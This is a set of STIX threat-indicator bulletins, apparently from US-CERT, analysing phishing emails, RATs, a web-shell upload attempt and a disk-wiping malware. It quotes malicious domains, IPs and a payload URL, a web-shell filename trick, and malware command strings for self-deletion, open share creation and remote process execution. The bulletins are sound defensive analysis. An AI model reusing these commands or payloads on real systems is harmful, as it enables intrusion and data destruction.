stix:STIX_Header.stix:Title: Phishing Email with a Arabic Language File
stix:STIX_Header.stix:Description:
On 16 April 2015, a US Government Agency was targeted with a phishing email using the Arabic Subject ????? ????? ?? 25 ??? 1394. The email included the malicious attachment ????? ????? ?? 25 ??? 1394.doc and was sent from sender m.mohsin.sultani.mod@aol.com. The attachment contained malware that exploits vulnerability CVE-2012-0158 and calls back to www.indiacertpsed.com (203.176.232.116).
A similiar phishing campaign was previously described in IB-15-10139.

stix:Indicator.indicator:Description:
--- START EMAIL HEADER --- EHLO oms-mc03.r1000.mx.aol.com MAIL FROM:<m.mohsin.sultani.mod@aol.com> SIZE=2875135 RCPT TO:[REDACTED] DATA Received: from omr-m09.mx.aol.com (omr-m09.mx.aol.com [64.12.143.82]) (using TLSv1 with cipher ADH-AES256-SHA (256/256 bits)) (No client certificate requested) by oms-mc03.r1000.mx.aol.com (AOL Outbound OMS Interface) with ESMTPS id 894E1380009BD for [REDACTED]; Tue, 14 Apr 2015 22:52:34 -0400 (EDT) Received: from mtaomg-mca02.mx.aol.com (mtaomg-mca02.mx.aol.com [172.26.221.80]) by omr-m09.mx.aol.com (Outbound Mail Relay) with ESMTP id 6EEAF70537BF4; Tue, 14 Apr 2015 22:52:34 -0400 (EDT) Received: from core-afa09a.mail.aol.com (core-afa09.mail.aol.com [172.27.24.9]) by mtaomg-mca02.mx.aol.com (OMAG/Core Interface) with ESMTP id 5CFAE38000087; Tue, 14 Apr 2015 22:52:33 -0400 (EDT) Received: from 126.72.93.151 by webprd-m93.mail.aol.com (10.74.71.96) with HTTP (WebMailUI); Tue, 14 Apr 2015 22:52:32 -0400 Date: Tue, 14 Apr 2015 22:52:32 -0400 From: [REDACTED] <m.mohsin.sultani.mod@aol.com> To: [REDACTED] Message-Id: <14cbafe06ed-4a7a-22424@webprd-m93.mail.aol.com> Subject: ???? ????? ?? 25 ??? 1394 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_148460_148499493.1429066352363" X-MB-Message-Source: WebUI X-MB-Message-Type: User X-Mailer: JAS STD X-Originating-IP: [126.72.93.151] x-aol-global-disposition: S X-SPAM-FLAG: YES X-AOL-VSS-INFO: 5700.7163/98281 X-AOL-VSS-CODE: clean DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mx.aol.com; s=20140625; t=1429066354; bh=puf6S3u+C2fHeb+4N0Zw1RXBxV3mGCNDr2UzodCfFQg=; h=From:To:Subject:Message-Id:Date:MIME-Version:Content-Type; b=nJqbvGs8fX8lOY6B2Z997eM5iTWHp83QGoRA4PxbGtvGQlM2totDDZqrsW7DjuLJO fC4cHGoquRlokaVK+6caSI027/ruhNL0TC3Gj7l5sufCZcox2Igf1C/wRjXaq7FURF KmK4yl3OcMfiNuqZnBEdu5Ws66avxmEdlpJSJW0M= X-AOL-REROUTE: YES x-aol-sid: 3039ac1add50552dd2717e5a ------=_Part_148460_148499493.1429066352363 Content-Type: multipart/alternative; boundary="----=_Part_148459_581121207.1429066352362" ------=_Part_148459_581121207.1429066352362 Content-Type: text/plain; charset=utf-8 Content-Transfer-Encoding: quoted-printable --- END EMAIL HEADER --- --- START EMAIL BODY --- From: [REDACTED] <m.mohsin.sultani.mod@aol.com> To: [REDACTED] Date: Wed Apr 15 02:52:32 GMT 2015 Attachments: ????? ????? ?? 25 ??? 1394.doc (2096772 bytes) Dear all!
Please find attached minutes of the media monitoring updates prepared by the MoIA Directorate of Communications and Public Relations.
[REDACTED NAME] Media Monitoring Officer (DMPR)(MOI) [REDACTED SIGNATURE] --- END EMAIL BODY ---

This is a Rich Text Format (RTF) document. When opened in Microsoft Word, it exploited CVE-2012-0158, then dropped and executed D.tmp (MD5: EB1F94375600A02330F7402782BCEDDB) in the Local Temp directory. The exploit created the benign decoy document ~tmp.doc (MD5: 22E099807005825E4F16AD431AC29FA3) in the user's Temp directory, opened it with Microsoft Word, and then the initial exploited Microsoft Word process terminated.

This is a 23-page benign Microsoft Word document containing Farsi text. The document contains an embedded image with an English Title: Islamic Republic of Afghanistan | Ministry of Interior Affairs Director of Media & Public Relations | Office of the Spokesman

When D.tmp was executed, the file renamed itself to mstmp.exe in the user's Application Data directory, executed mstmp.exe, and created a Microsoft Windows Shortcut msexw.lnk (MD5: E8E257D6BB05B941DA0CF38A31FB42E6) in the user's Startup folder for persistence, then exited.

Path:C:\Documents and Settings\[User]\Application Data\mntat\mstmp.exe
This file was renamed from the file D.tmp (MD5 22E099807005825E4F16AD431AC29FA3). When executed, mstmp.exe created msexc.exe and the password protected zip msexw.zip in the Application Data directory. It then extracted msdis.dll from msexw.zip and dropped msdis.dll in the same directory, then deleted msexw.zip. Finally, it executed msexc.exe and terminated.

This is a Microsoft Windows shortcut file located in the Startup folder, which establishes persistence by starting up automatically any time the user logs in.
Target: C:\DOCUME~1\[User]\APPLIC~1\mntat\msexc.exe
This file was also used in a previous campaign described in IB-15-10139.
This is a password protected zip file that contains the file named msdis.dll (MD5: 9D45B71CC365E46177F71B0216C32C30).

When the executable file msexc.exe was executed, it deleted mstmp.exe (MD5: EB1F94375600A02330F7402782BCEDDB) from:
C:\Documents and Settings\[User]\Application Data\mntat
It loaded and executed the DLL implant msdis.dll (MD5: 9D45B71CC365E46177F71B0216C32C30).
When this DLL's JustTempFun export is executed, it sent a DNS request for www.indiacertpsed.com, then created a TCP connection.

The file msdis.dll (MD5: 9D45B71CC365E46177F71B0216C32C30) sent a DNS request to this domain followed by this GET request:
GET  HTTP/1.1 User-Agent: Mozilla/6.0 (compatible; MSIE 9.0; Windows NT 8.1; .NET CLR 2.13.431) Host: www.indiacertpsed.com:53 Cache-Control: no-cache
The traffic repeats approximately every 150 seconds. According to the report, the HTTP traffic was sent to port 53, which is normally for DNS; this could be an attempt to evade network signatures.

stix:STIX_Header.stix:Title: Phishing Email with Pleasantly Surprised Theme Included Gh0st RAT Malware
stix:STIX_Header.stix:Description: On 24 November 2014, a phishing email was sent from amars59@att.net with the subject "Pleasantly surprised". The email included the malicious attachment Pleasantly surprised.zip (MD5: A6BE27F508C018B5957BCAE8F4259A0C), which contained the Gh0st remote administration tool (RAT). The Gh0st RAT called back to www.meitanjiaoyiwang.com. Similar activity was previously tracked under the name "Lonely Warrior".

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- EHLO nm38-vm7.bullet.mail.ne1.yahoo.com MAIL FROM:<amars59@att.net> RCPT TO: [REDACTED] DATA Received: from [127.0.0.1] by nm38.bullet.mail.ne1.yahoo.com with NNFMP; 24 Nov 2014 14:21:58 -0000 Received: from [98.138.226.180] by nm38.bullet.mail.ne1.yahoo.com with NNFMP; 24 Nov 2014 14:18:58 -0000 Received: from [216.39.60.175] by tm15.bullet.mail.ne1.yahoo.com with NNFMP; 24 Nov 2014 14:18:47 -0000 Received: from [216.39.60.160] by tm11.access.bullet.mail.gq1.yahoo.com with NNFMP; 24 Nov 2014 14:18:46 -0000 Received: from [127.0.0.1] by omp1026.access.mail.gq1.yahoo.com with NNFMP; 24 Nov 2014 14:18:46 -0000 X-Yahoo-Newman-Property: ymail-4 X-Yahoo-Newman-Id: 739958.49126.bm@omp1026.access.mail.gq1.yahoo.com Received: (qmail 61084 invoked by uid 60001); 24 Nov 2014 14:18:46 -0000 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=att.net; s=s1024; t=1416838726; bh=DJwkNOXBO5Vr8T9ztEL7L9v+CX1WsIts1T0u6E2/SuY=; h=Message-ID:Date:From:Reply-To:Subject:To:MIME-Version:Content-Type; b=QWcnGTr7JwFONcxAhhewGdAO4xliTSKda2aAqZo3kK8TA/d1lAAmOtqbjCL1BWHx4uUd1k4J839e4pK6Weu16HZAZokg5DIbl32NYzedKLolfU9my99enrum+Zag8hrT79m+9617PBiSWFWo1VXODp4yGB0aScq/NAKcrbogioE= X-YMail-OSG: Ooy5sWEVM1lNfyh3S3zO22rWakP1ktyu.2ZWHEZf.ddER7U 4Kg_LcVFoBijfwgy7gNX4qTxNnvDY7bXAsJkdVJyK.bxIS59BdrmkgN7LnzH m1J85mqIHb7q8gQheLFZ2ioxKvr8H6CVRzsHPrIus0JkauowRbSJSNXhq8oN P5CzurDDO4GJrIUY_o4sbWyXKHZ6R8_deuMJDoIEItU0QEpR9BZHmIJOSa17 BZrEo_3NoNhCIJ95x7K0ZU32W4PWu6ZZtLMiN254yVGzcDfZ2Olw.PoKVG_B sGfYgRYsE0wScpolJ5fjo2e3tk2cnaMJ3GhJDrBN5E8zJQHTBHKlADky38bV VnSUsDI_sxcLkK131fC4HfG8TC1.YAQ2x9_vrXIvt3Qiq7GTdnAHczvXl2uf 5bRK31cv3XWFJpJBnDEKQRNwu_eVY8LTJTOV6iTEbxO21B3ucovSvmK1aXNj eGZ7T.KoaHQCwpos_dHEIdD42tQA6l0FCB7jniwD8eVTarQfOIgw.Bsebiyk KrB.hpTp4gc2FqGMbxjGmOPDJAAJKA4FIpLCiNA-- Received: from [117.22.74.105] by web184905.mail.gq1.yahoo.com via HTTP; Mon, 24 Nov 2014 06:18:46 PST X-Rocket-MIMEInfo: 002.001,CgEwAQEBAQ-- X-Mailer: YahooMailWebService/0.8.203.740 Message-ID: <1416838726.87392.YahooMailNeo@web184905.mail.gq1.yahoo.com> Date: Mon, 24 Nov 2014 06:18:46 -0800 From: [REDACTED] <amars59@att.net> Reply-To: [REDACTED] <amars59@att.net> Subject: Pleasantly surprised To: [REDACTED] MIME-Version: 1.0 Content-Type: multipart/mixed; boundary="1321605460-1026027343-1416838726=:87392" --1321605460-1026027343-1416838726=:87392 Content-Type: multipart/alternative; boundary="1321605460-1796247108-1416838726=:87392" --1321605460-1796247108-1416838726=:87392 Content-Type: text/plain; charset=us-ascii ---- END EMAIL HEADER ----
The email body was blank.
The attachment is a .zip archive that contained the file Pleasantly surprised.Exe (MD5: BBF30659A020F6E63F6B82946794996F).

This executable file displayed an orange "Play" button icon. When executed, it created the hidden folder C:\Recycle09102014 and installed the .dll file GameUpdate.log (MD5: A563A2F53ADAA6DADB34AB5ED85EC329). It then modified the System Registry for persistence, executed GameUpdate.log, and then used a command to delete itself.
The following command was used to execute the .dll file: RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry
The following command was used to delete itself: cmd /c ping 127.0.0.1 -n 1&del "C:\Documents and Settings\User\Desktop\Pleasantly surprised.Exe"
Multiple registry values were added for persistence. The hex value was decoded as: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GameInit: RUNDLL32.EXE C:\Recycle09102014\GameUpdate.log,LoaderEntry
Two Base64 values were decoded.
BITS\LoginAddress: 00000000 3c 85 de 05 98 ec 41 c4 e8 45 97 e0 49 da f4 41 <.....A. .E..I..A 00000010 c5 e8 45 95 a7 48 9a e4 2a ..E..H.. *
BITS\LoginPort: 00000000 cc 40 bc 2a .@.*
According to the report, this was identified as a Gh0st RAT .dll file.

stix:STIX_Header.stix:Title: Phishing Emails with Transaction and Payment Themes Include Upatre and Dyre Malware
stix:STIX_Header.stix:Description: On 17 March 2015, a phishing email was sent to an IT organization from multiple senders with transfer, transaction, and payment themes. The emails included malicious attachments that contained a downloader disguised as a Word document (MD5: 2b370bb3ef318e679113d534c64eeb6d). This malware was associated with Upatre/Dyre malware activity. The domains savepic.su and optimalstormwater.com.au were contained in the downloader file.

stix:Indicator.indicator:Description:
Multiple senders and subject lines were used in this campaign.
Senders included the following:
elisangela@sefaz.feiradesantana.ba.gov.br admin@wb5qng.org david.bonneville@aquareve-piscines.fr mincogroup@minco.co.za mincogroup@minco.co.za gigi@mail.absupplyco.com info@wills.lk info@whittbrothers.co.uk info@reditus.net douwlene.vandeventer@westvaal.co.za shushufindi@transcoiv.com email@ausscotsystems.com.au admin@sfitc.com mail@arkinbutler.co.uk
Multiple subject lines were used. All of them had a single capitalized letter followed by six variable digits such as (J674699):
Denied transfer Aborted transfer Rejected transaction Denied transaction Aborted transaction Cancelled transaction Aborted payment Cancelled payment

EmailMessageObj:Header.EmailMessageObj:Subject: Denied transfer (J674699)
EmailMessageObj:Header.EmailMessageObj:X_Mailer: Synapse - Pascal TCP/IP library by Lukas Gebauer

stix:Indicator.indicator:Description:
This file was contained in the malicious .zip attachments named after variations of the email subject lines. The source report associated this with Upatre/Dyre malware.
Multiple antivirus programs identified this file as a downloader with Cyrillic language encoding.

This domain was included in the malicious file ACH Transcation Details_19706.doc (MD5: 2b370bb3ef318e679113d534c64eeb6d).
On 13 March 2015, this domain was also used in a similar phishing campaign against an energy sector entity.
This domain was included in the malicious file ACH Transcation Details_19706.doc (MD5: 2b370bb3ef318e679113d534c64eeb6d).

stix:STIX_Header.stix:Title: Attempted Upload of Web Shell RAT on DIB Website
stix:STIX_Header.stix:Description: On 25 May 2015, attackers used the IP address 217.66.201.129 in an attempt to upload a web shell to the website of a defense industrial base (DIB) organization. The DIB organization had satellite communications contracts with the U.S. government. The webshell was identified as the 3fexe (MD5: 52f4780a02e00b1a66fb1c458d09e6df) remote administration tool (RAT).

stix:Indicator.indicator:Description: On 25 May 2015 01:16 PM GMT, attackers used this IP address, registered in Iran, to upload a web shell to the website of a satellite communications company with U.S. Government contracts.

This is the 3fexe web shell. This web shell provides multiple remote administration functions, to include registry changes, uploading files, copying files from the server, deleting files, obtaining a command shell, and system enumeration. It runs with the same privileges as the underlying web server. This sample of malware is detected by McAfee antivirus as ASP/BackDoor.gen.c.
The web shell was disguised as a .jpg image file via its file extension. The attackers used an HTTP POST request to upload the web shell to the website via the "?gf_page=upload" URL argument. The following form fields were used in the POST:
fileToUpload: h.asp;.jpg form_id: 1 submit: Upload Image
The attackers attempted to exploit a vulnerable Gravity Forms WordPress plug-in as described in this article: https://blog.securi.net/2015/02/malware-cleanup-to-arbitrary-file-upload-in-gravity-forms

stix:STIX_Header.stix:Title: Micro Targeted Advertising Exploits Flash and Serves Malware
stix:STIX_Header.stix:Description:
On 6 February 2015 it was reported that legitimate sites were serving real-time bidding malicious ads. Initially, a .swf file was downloaded to exploit Flash which led the host to download second stage malware.
Some of the legitimate sites include:
photogallery.indiatimes.com timesofindia.indiatimes.com www.wordfind.com www.wowhead.com www.answers.com www.blackpeoplemeet.com ads.us.e-planning.net www.answers.com www.stltoday.com peru.com
The malicious RTB TTP was reported on in IB-14-10645

stix:Indicator.indicator:Description: This is the URL for the .swf file that exploits Flash. The .swf file automatically downloads once the legitimate site was visited.
An executable file is downloaded after visiting this URL. The executable file was reported as an image/jpeg in the header field of the HTTP response.
An executable file is downloaded after visiting this URL. The executable file was reported as an image/jpeg in the header field of the HTTP response.
This is the file from visiting either of the two URLs. It was reported as icqsmiley type malware.

stix:STIX_Header.stix:Title: Malicious Email Campaign Using "Internships?" or "ACH" or "Payment Receipt" Subject Themes Containing Malicious Attachment
stix:STIX_Header.stix:Description: On May 8, 2015, US-CERT was notified by a trusted third party of a malicious email campaign using "Internships?" or "ACH" or "Payment Receipt" themes containing a malicious attachment.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:Indicator.indicator:Description: The malicious email campaign had a "Payment Receipt" theme and attempted to deliver Dridex malware.

The attachment is a standard Word document with a macro. The macro pulls the payload from the following URL: http://80.242.123.211:888/moist.exe
This file is associated with a malicious email campaign using an "ACH" subject theme and attempted to deliver Upatre/Dyre malware. The sender?s email address was not provided by the trusted third party.
According to the trusted third party, the subject lines include random numerical values (i.e. "Random Digits"): Denied Automated Clearing House (ACH) transfer <Insert Random Digits> Cancelled ACH transfer <Insert Random Digits> Rejected ACH transfer <Insert Random Digits> Denied ACH transfer <Insert Random Digits> Denied Automated Clearing House (ACH) payment <Insert Random Digits>
MD5 associated with the uncompressed attachment. The filename was not provided.
This URL is associated with the emails using "Internships?" subject theme and attempted to deliver Graftor malware.
This URL is associated with the emails using "Internships?" subject theme and attempted to deliver Graftor malware.
This URL is associated with the emails using "Internships?" subject theme and attempted to deliver Graftor malware.

stix:STIX_Header.stix:Title: Phishing Email with Added Friend Theme Includes a Malicious Link
stix:STIX_Header.stix:Description: On 15 October 2014, a phishing email was sent from vivian.grey@aol.com with the subject "You've added me as a friend". The email included a malicious link to www.vetaffair.com.

stix:Indicator.indicator:Description: ---- BEGIN EMAIL BODY ---- You've added me as a friend, but I don't have an idea who are you. ---- END EMAIL BODY ----

EmailMessageObj:Header.EmailMessageObj:Subject: You've added me as a friend

stix:Indicator.indicator:Description: The email included this embedded link in the message: http://www.vetaffair.com/ox/services/default.asp?id=[number]

stix:STIX_Header.stix:Title: Wiper Malware Overwrites Files and MBR
stix:STIX_Header.stix:Description:
This bulletin serves as an update to IB-14-10615.
On 30 November 2014 a U.S. government department performed analysis of destructive malware used by unidentified actors. This malware has the capability to overwrite a victim host's master boot record (MBR) and all data files. The overwriting of the data files will make it extremely difficult and costly, if not impossible, to recover the data using standard forensic methods. During lab dynamic runs with a 40GB and 8GB hard drive, all files were deleted and the MBR was wiped within an hour of executing the malware.
Analysis of this malware is presented to provide the computer network defense (CND) community with indicators of this malware.
No further information is available at this time from the reporting government department.

stix:Indicator.indicator:Description:
PE Header information: PE Compile Time: 2014-11-22 00:06:54 Language pack of resource section: Korean
The original filename of this file is unknown, but it was likely "diskpartmg16.exe". This file creates the destructive malware, "igfxtrayex.exe". When the file was executed, it started a second instance of itself with "-i" as an argument, then terminated.
The second instance of the file installed itself as the "WinsSchMgmt" service with "-k" as a command line argument, started the service, then terminated. The "WinsSchMgmt" service executed the file with "-k" as an argument, which started another instance of the file using "-s" as an argument.
The "-s" instance created and executed igfxtrayex.exe, created net_ver.dat, and began generating network traffic over TCP ports 445 and 139 to IP addresses contained in the file net_ver.dat.
The "-s" instance of "WinsSchMgmt" service created by "diskpartmg16.exe" (MD5 D1C27EE7CE18675974EDF42D4EEA25C6) was observed during analysis attempting network traffic sent on ports 445 and 139 to the IP addresses contained in the file net_ver.dat:
An example of network traffic on port 445 follows: 00000000 00 00 00 85 ff 53 4d 42 72 00 00 00 00 18 53 c8 .....SMB r.....S. 00000010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff fe ........ ........ 00000020 00 00 00 00 00 62 00 02 50 43 20 4e 45 54 57 4f .....b.. PC NETWO 00000030 52 4b 20 50 52 4f 47 52 41 4d 20 31 2e 30 00 02 RK PROGR AM 1.0.. 00000040 4c 41 4e 4d 41 4e 31 2e 30 00 02 57 69 6e 64 6f LANMAN1. 0..Windo 00000050 77 73 20 66 6f 72 20 57 6f 72 6b 67 72 6f 75 70 ws for W orkgroup 00000060 73 20 33 2e 31 61 00 02 4c 4d 31 2e 32 58 30 30 s 3.1a.. LM1.2X00 00000070 32 00 02 4c 41 4e 4d 41 4e 32 2e 31 00 02 4e 54 2..LANMA N2.1..NT 00000080 20 4c 4d 20 30 2e 31 32 00 LM 0.12 . 137 bytes
The only traffic observed going to port 139 were SYN packets.
The network activity is likely an attempt at reconnaissance and propagation within the compromised host's network.
The following files were added: C:\Documents and Settings\User\Desktop\igfxtrayex.exe C:\WINDOWS\system32\net_ver.dat
The following strings of interest were in this file: ---BEGIN STRINGS--- recdiscm32.exe taskhosts64.exe taskchg16.exe rdpshellex32.exe mobsynclm64.exe comon32.exe diskpartmg16.exe dpnsvr16.exe expandmn32.exe hwrcompsvc64.exe cmd.exe /q /c net share shared$ /delete \\%s\admin$\syswow64 \\%s\admin$\system32 cmd.exe /q /c net share shared$=%SystemRoot% cmd.exe /q /c net share shared$=%SystemRoot% /GRANT:everyone,FULL RasSecruity RasMgrp cmd.exe /c wmic.exe /node:"%s" /user:"%s" /password:"%s" PROCESS CALL CREATE "%s" > %s WinsSchMgmt Windows Schedule Management Service ---END STRINGS---

This is a configuration file containing what appear to be hostnames, IP addresses, and the number 2. Entries in the file have the structure "HOSTNAME|IP Address|2". The IP addresses in this file correspond with the IP addresses listed under the file with MD5 hash D1C27EE7CE18675974EDF42D4EEA25C6.
The "-s" instance of "WinsSchMgmt" service created by "diskpartmg16.exe" (MD5 D1C27EE7CE18675974EDF42D4EEA25C6) was observed during analysis attempting network traffic sent on ports 445 and 139 to the IP addresses contained in the file net_ver.dat:
An example of network traffic on port 445 follows: 00000000 00 00 00 85 ff 53 4d 42 72 00 00 00 00 18 53 c8 .....SMB r.....S. 00000010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff fe ........ ........ 00000020 00 00 00 00 00 62 00 02 50 43 20 4e 45 54 57 4f .....b.. PC NETWO 00000030 52 4b 20 50 52 4f 47 52 41 4d 20 31 2e 30 00 02 RK PROGR AM 1.0.. 00000040 4c 41 4e 4d 41 4e 31 2e 30 00 02 57 69 6e 64 6f LANMAN1. 0..Windo 00000050 77 73 20 66 6f 72 20 57 6f 72 6b 67 72 6f 75 70 ws for W orkgroup 00000060 73 20 33 2e 31 61 00 02 4c 4d 31 2e 32 58 30 30 s 3.1a.. LM1.2X00 00000070 32 00 02 4c 41 4e 4d 41 4e 32 2e 31 00 02 4e 54 2..LANMA N2.1..NT 00000080 20 4c 4d 20 30 2e 31 32 00 LM 0.12 . 137 bytes
The only traffic observed going to port 139 were SYN packets.
The network activity is likely an attempt at reconnaissance and propagation within the compromised host's network.

PE Header info: PE Compile Time: 2014-11-24 04:11:08 Language pack of resource section: Korean
This file is destructive malware; a disk wiper with network beacon capabilities. If "igfxtrayex.exe" is run with no parameters, it creates and starts a copy of itself with the -i argument. The result of this is that after 10 minutes, "igfxtrayex.exe" makes three copies of itself and places them in the same directory it was executed from. These copies are named according to the format "taskhostXX.exe" (where X is a randomly generated ASCII character). These copies are then executed, each with a different argument (one being "-m", one being "-d" and the other "-w"). Network connection attempts are made to one of three hard-coded IP addresses in a random order to either port 8080 or 8000. If a connection to that IP address cannot be made, it attempts to connect to another of the three IP addresses, until connections to all three IP addresses have been attempted. The following command-line string is then executed: "cmd.exe /c net stop MSExchangeIS /y". A 120 minute (2 hour) sleep command is issued after which the computer is shutdown and rebooted.
A summary of the command-line arguments is provided here for clarity: -i: Installs and starts the "brmgmtsvc" service, description "Backup and Restore Management Service", with the -k argument. -k: Starts "brmgmtsvc" service. After 10 minutes, copies itself to 3 copies of "igfxtrayex.exe" renamed with the following format "taskhostXX.exe" (where X is a randomly generated ASCII char) and appends one of three parameters and executes in the order of "taskhostXX.exe -w", "taskhostXX.exe -m", "taskhostXX.exe -d". -w: Gets "iissvr.exe" from resource section, drops it to "C:\WINDOWS\iissvr.exe", and executes it. -m: Creates 32-bit and 64-bit versions ("usbdrv3_32bit.sys" and "usbdrv3_64bit.sys") of a drive wiper from the resource section. Creates a service named "usbdrv3" with description "USB 3.0 Host Controller". The service controls a driver which allows direct access to the physical drive. This service provides the functionality to overwrite the MBR and once the computer is rebooted, it is inoperable. -d: Executes overwrite and deletion of select files on the operating system. Network beacon traffic went to the following three IP addresses over TCP ports 8000 and 8080: 88.53.215.64 217.96.33.164 203.131.222.102
While the method used to overwrite and delete files on network and hard disk drives uses standard windows APIs, it is important to note that the author of this malware created logic which checks the file extension of each file for ".dll" and ".exe" and does not overwrite these files, but does delete them. If a file extension does not end in ".dll" or ".exe" the file is overwritten before deletion occurs. This renders all non-binary files with all file extensions except ".dll" and ".exe" unrecoverable without significant forensic effort. The logic of not overwriting files with ".exe" and ".dll" extensions could be a custom optimization to ensure files are quickly overwritten and deleted to ensure maximum destruction of intellectual property in the quickest manner. The logic for deletion also checks the directory and does not overwrite or delete any files in "C:\Windows" and "C:\Program Files". These file paths are not hard-coded into the malware, but rather are the result of calls to the Windows API functions GetWindowsDirectory and SHGetSpecialFolderPath respectively. Consequently, different versions of Windows may return different "protected" directories (such as "C:\Program Files (x64)" for 64-bit versions of Windows). This logic of not overwriting ".dll" and ".exe" files before deleting them and also not deleting or overwriting any files in the "C:\Windows" and "C:\Program Files" directories can be used loosely as an author fingerprint to distinguish this wiper and possibly future versions of this wiper from wipers developed by other authors.
The 2-hour timer while files are being overwritten before the computer is rebooted to an inoperable state could be a way to allow for as many files to be deleted as possible. During lab dynamic runs with a 40GB and 8GB hard drive, all files were deleted and the MBR was wiped within an hour of executing the malware.

igfxtrayex.exe attempted network traffic to the following three IP addresses over TCP ports 8000 and 8080: 88.53.215.64 217.96.33.164 203.131.222.102
Sample beacons (in HEX) using different victim hostnames are presented below: --- SAMPLE BEACON 1 --- 00000000 28 00 16 0b 0b 16 56 49 43 54 49 4d 2d 4d 41 43 (.....VI CTIM-MAC 00000010 48 49 4e 45 00 71 80 6b ab 71 ff ff ff ff 63 6b HINE.q.k .q....ck 00000020 ab 71 98 13 40 00 04 00 00 00 .q..@... ..
--- SAMPLE BEACON 2 --- 00000000 28 00 16 0b 0b 1e 49 41 4d 50 41 57 4e 45 44 00 (.....IA MPAWNED. 00000010 a6 00 c7 24 ac 71 80 6b ab 71 ff ff ff ff 63 6b ...$.q.k .q....ck 00000020 ab 71 98 13 40 00 04 00 00 00 .q..@... .. --- SAMPLE BEACON 3 --- 00000000 28 00 01 01 01 02 41 42 43 44 45 46 47 48 49 4a (.....AB CDEFGHIJ 00000010 4b 4c 4d 4e 4f 00 80 6b ab 71 ff ff ff ff 63 6b KLMNO..k .q....ck 00000020 ab 71 98 13 40 00 04 00 00 00 .q..@... ..
Breaking out the first example beacon, analysis of the format of the payload follows: Bytes 1-2: 28 00 -> These bytes are potentially the size of the payload of the beacon packet. In all observed beacons, the payload of the beacon packet was 42 bytes. Taking these two bytes (0x0028 if it is in little endian) yields a payload size following these two bytes of 40 bytes (or hex 0x28). Bytes 3-6: 16 0b 0b 16 -> These bytes correspond to the IP address of the victim machine (22.11.11.22 in this case - this is the static IP address of the workstation used for this analysis). Bytes 7-20: 56 49 43 54 49 4d 2d 4d 41 43 48 49 4e 45 -> These bytes correspond to the hostname (VICTIM-MACHINE in this case) - a maximum of 15 characters, corresponding to the maximum size of a NetBIOS hostname. Bytes 21-40: 80 6b ab 71 ff ff ff ff 63 6b ab 71 98 13 40 00 04 00 00 00 -> These bytes may be exfiltration or if determined to be hard-coded or constant, could be used to develop network signatures. In all testing performed to date, the 0xff bytes have been constant.

PE Compile Time: 2014-11-13 02:05:35 Language pack of resource section: Korean
When executed, this file starts a listener on localhost port 80. It has 3 files contained in the resource section, all xor'd with 0x63. One of the files is an HTML file with ransom demands and warning about exfiltrated content claiming to be located at 5 URLs. The other two files are a .wav sound file that is played and an image file that is shown as part of the webpage.

PE Compile Time: 2009-08-21 06:05:32 This is a .SYS file, and is a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000, XP, 2003, Vista, 2008 (32-bit). It is created from resource ID 0x81 of "igfxtrayex.exe".

PE Compile Time: 2009-08-21 06:05:35
This SYS file is a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000, XP, 2003, Vista, 2008 (64-bit). It is created from resource ID 0x83 of "igfxtrayex.exe".
The 64-bit version of the driver, usbdrv3_64bit.sys, was seen in the SHAMOON malware in 2012. The driver is a legitimate driver (known as elrawdisk.sys) developed by the UK-based company EldoS Corporation as part of their RawDisk product. It allows user-mode applications to directly access files, disks and partitions of the disks, while bypassing the security limitations of the Windows OS. The use of this driver is not an indication that the author of this wiper and SHAMOON's author are the same.

stix:STIX_Header.stix:Title: Phishing Email with LinkedIn Theme
stix:STIX_Header.stix:Description: On 30 September 2014, a phishing email was sent from lhoffman.mwr@gmail.com to a defense industrial base (DIB) organization. The email asks the recipient to connect with them on the professional social networking site LinkedIn.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- Subject: [REDACTED], please add me to your LinkedIn network From: Lisa (Lilly) Hoffman <member@linkedin.com>; SMTP From: s-2f382k9bjzyr21fc88f992gpwcpbq3bpve07bk7p2oiut0gjug1czuxx@bounce.linkedin.com; To: [REDACTED]; Date: Tue Sep 30 03:12:19 GMT 2014 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linkedin.com;s=proddkim1024; t=1412046740;bh=N6Zdea82DKkH0p0hzXSE3htspKI83FKFw0ZKie/1wzY=;h=From:Subject:MIME-Version:Content-Type:To:Date:X-LinkedIn-Class:X-LinkedIn-Template:X-LinkedIn-fbl;b=NA4Xi4PyudGe1/UbnGyUfzRyiQBB7PjKb+FW5d/qvzSuFcVd7DVxikXCAjYZKeNKSpg8H3nndpmUeOPo6tkxhLt7LkkoJzPVCwz0E9YA4QrvJWs1aeTLeuANx5DsqRGNHbYRJXh4CYJInotkk1zJDjBQeVvJW1rQnXG8/SYUZUQ= Message-ID: <1838702464.7680003.1412046739559.JavaMail.app@ela4-app8303.prod> MIME-Version: 1.0 Content-Type: multipart/alternative; boundary="----=_Part_7680001_2123430648.1412046739557" X-LinkedIn-Class: INVITE-MBR X-LinkedIn-Template: invite_member_28 X-LinkedIn-fbl: s-2f382k9bjzyr21fc88f992gpwcpbq3bpve07bk7p2oiut0gjug1czuxx X-LinkedIn-Id: 47c50b-i0oo5iim-1w ---- END EMAIL HEADER ----
---- BEGIN EMAIL BODY ---- Subject: [REDACTED], please add me to your LinkedIn network From: Lisa (Lilly) Hoffman <member@linkedin.com>; To: [REDACTED]; Date: Tue Sep 30 01:42:47 GMT 2014 Hi [REDACTED], I'd like to connect with you on LinkedIn.
Lisa (Lilly) Hoffman Senior Advisor for Veteran Employment ---- END EMAIL BODY ----

stix:STIX_Header.stix:Title: Watering Hole Compromise of Economic Development Website Attempts to Exploit CVE-2015-0313
